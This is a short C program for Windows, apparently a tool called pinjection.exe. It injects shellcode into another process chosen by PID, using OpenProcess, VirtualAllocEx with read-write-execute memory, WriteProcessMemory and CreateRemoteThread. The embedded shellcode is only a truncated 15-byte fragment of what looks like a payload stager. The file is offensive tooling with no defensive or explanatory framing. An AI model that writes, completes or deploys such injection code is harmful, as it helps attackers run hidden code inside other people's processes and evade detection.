#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>

void inject(int pid) {
    unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52";
    HANDLE pidproc;
    PVOID memaddr;
    BOOL writescmem;
    SIZE_T written;
    HANDLE thrd;

    pidproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (pidproc) {
        printf("[+] PID opened\n");
    } else {
        printf("[-] PID not found\n");
        exit(1);
    }

    memaddr = VirtualAllocEx(pidproc, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (memaddr) {
        printf("[+] Allocated virtual memory: 0x%08x\n", memaddr);
    }

    writescmem = WriteProcessMemory(pidproc, memaddr, shellcode, sizeof(shellcode), &written);
    if (writescmem) {
        printf("[+] Shellcode written to memory\n");
    }

    thrd = CreateRemoteThread(pidproc, NULL, 0, (LPTHREAD_START_ROUTINE)memaddr, NULL, 0x0, NULL);
    if (thrd) {
        printf("[+] Shellcode executed!\n");
    }
    CloseHandle(pidproc);
}

void help() {
    printf(R"EOF(usage: pinjection.exe PID
    options:
      PID,                      task pid
)EOF");
}

int main(int argc, char** argv) {
    if (argv[1] == NULL) {
        help();
        return 1;
    }

    int pid = atoi(argv[1]);
    inject(pid);
}